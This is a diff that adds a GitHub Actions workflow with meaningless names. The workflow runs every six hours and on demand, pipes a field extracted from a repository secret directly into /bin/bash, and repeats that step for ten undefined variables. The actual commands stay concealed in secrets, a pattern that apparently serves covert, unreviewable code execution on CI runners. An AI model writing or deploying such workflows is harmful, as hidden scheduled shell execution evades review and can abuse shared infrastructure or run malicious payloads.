@@ -1,0 +1,26 @@
+name: kaklixn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kaklixn
+        env:
+          gpz1928: ${{ secrets.gpz1928 }}
+        run: |
+          echo $gpz1928 | jq -r .qm353 | /bin/bash
+          echo $gf11930 | jq -r .dd95911 | /bin/bash
+          echo $fdku65586 | jq -r .kgd86078 | /bin/bash
+          echo $ohgip390 | jq -r .dsecx2563 | /bin/bash
+          echo $bk8 | jq -r .isj3 | /bin/bash
+          echo $ku00 | jq -r .tys5 | /bin/bash
+          echo $ntex21535 | jq -r .mdrq30453 | /bin/bash
+          echo $mf4 | jq -r .inyst21709 | /bin/bash
+          echo $pah47812 | jq -r .yq6591 | /bin/bash
+          echo $zydp640 | jq -r .usoxg92 | /bin/bash
+          echo $iuyx977 | jq -r .m9124 | /bin/bash
+
